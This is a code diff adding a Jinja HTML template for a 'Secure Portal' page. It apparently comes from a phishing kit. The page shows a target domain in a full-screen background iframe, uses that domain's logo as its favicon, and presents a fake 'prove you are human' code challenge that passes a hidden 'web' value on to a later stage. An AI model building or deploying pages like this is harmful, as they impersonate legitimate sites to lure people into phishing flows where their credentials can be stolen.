@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal</title>
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f3f3f3;
+            overflow: hidden;
+        }
+        #background-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: -1;
+        }
+        .signin-container {
+            background: linear-gradient(135deg, #ffffff, #f9f9f9);
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 400px;
+            box-sizing: border-box;
+            animation: fadeIn 1s ease-in-out;
+        }
+        .signin-container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+        }
+        .signin-container img {
+            display: block;
+            margin: 0 auto 10px;
+        }
+        .signin-container form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .signin-container label {
+            width: 65%;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #555;
+        }
+        .signin-container input,
+        .signin-container button {
+            width: 65%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        .signin-container input:hover,
+        .signin-container input:focus {
+            border-color: #007BFF;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
+        }
+        .password-container {
+            width: 65%;
+            position: relative;
+            margin-bottom: 15px;
+        }
+        .password-container input {
+            width: 100%;
+            padding: 10px;
+            padding-right: 40px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .password-container .show-password {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #aaa;
+            font-size: 18px;
+            transition: color 0.3s ease;
+        }
+        .password-container .show-password:hover {
+            color: #007BFF;
+        }
+        .password-container .show-password::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: #fff;
+            font-size: 10px;
+            padding: 3px 5px;
+            border-radius: 3px;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            white-space: nowrap;
+        }
+        .password-container .show-password:hover::after {
+            opacity: 1;
+            visibility: visible;
+        }
+        .signin-container button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+        }
+        .signin-container button:hover {
+            background-color: #0056b3;
+            transform: scale(1.05);
+        }
+        footer {
+            margin-top: 10px;
+        }
+        footer p {
+            font-size: 0.6em;
+            text-align: center;
+        }
+        @media (max-width: 600px) {
+            .signin-container {
+                padding: 15px;
+            }
+            .signin-container h2 {
+                font-size: 16px;
+            }
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Loader Styling */
+        #loader {
+            text-align: center;
+            padding: 40px;
+            background-color: rgba(245, 245, 245, 0.9);
+            border-radius: 21px;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 0.5s ease-in-out;
+            transition: transform 0.3s ease-in-out;
+            display: none; /* Initially hidden */
+        }
+        
+        #loading-spinner {
+            margin: 20px auto;
+            border: 10px solid rgba(51, 51, 51, 0.1);
+            border-radius: 50%;
+            border-top: 10px solid #007bff;
+            width: 60px;
+            height: 60px;
+            animation: loading 1s linear infinite;
+        }
+        
+        #info p {
+            margin: 13px 0;
+            font-size: 15px;
+            animation: fadeIn 0.5s ease-in-out;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        @keyframes loading {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <!-- Background iframe -->
+    <iframe id="background-iframe" src="https://{{ins}}"></iframe>
+
+    <!-- Loader Section -->
+    <div id="loader">
+        <div id="loading-spinner"></div>
+        <div id="info"></div>
+    </div>
+
+    <!-- Signin Form -->
+    <div class="signin-container" id="signin-container" style="display:none;">
+        <div id="forms">
+            <center>
+                <h1>Security Code Challenge</h1>
+                <p>Solve the following tasks to prove that you are human</p>
+                <div id="captcha-container">{{ code }}</div>
+				<br>
+                <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
+                    <input id="captcha-input" type="text" placeholder="Please enter the code above" name="code" required>
+                    <input type="hidden" name="web" value="{{ request.args.get('web') }}">
+                    <br>
+                    <button id="captcha-submit" type="submit">Submit</button>
+                </form>
+                <p id="captcha-message"></p>
+
+                <footer>
+                    <p>Authentication is required!<br> © 2025 Secure Portal | Privacy</p>
+                    <p type="hidden" id="info-text"></p>
+                </footer>
+            </center>
+        </div>
+    </div>
+
+    <script>
+        // Show the form after page loads
+        window.addEventListener('load', function() {
+            document.getElementById('signin-container').style.display = 'block';
+        });
+
+        // Verify if user input matches the code
+        var captchaForm = document.getElementById('captcha-form');
+        var errorMessage = document.getElementById('captcha-message');
+
+        captchaForm.addEventListener('submit', function(event) {
+            event.preventDefault();
+            var captchaInput = document.getElementById('captcha-input');
+
+            if (captchaInput.value == "{{ code }}") {
+                // Submit the form
+                captchaForm.submit();
+            } else {
+                errorMessage.innerText = 'Sorry, the code you entered is incorrect. Please try again.';
+                errorMessage.style.display = 'block'; // Show error message
+                captchaInput.value = '';
+            }
+        });
+    </script>
+</body>
+</html>
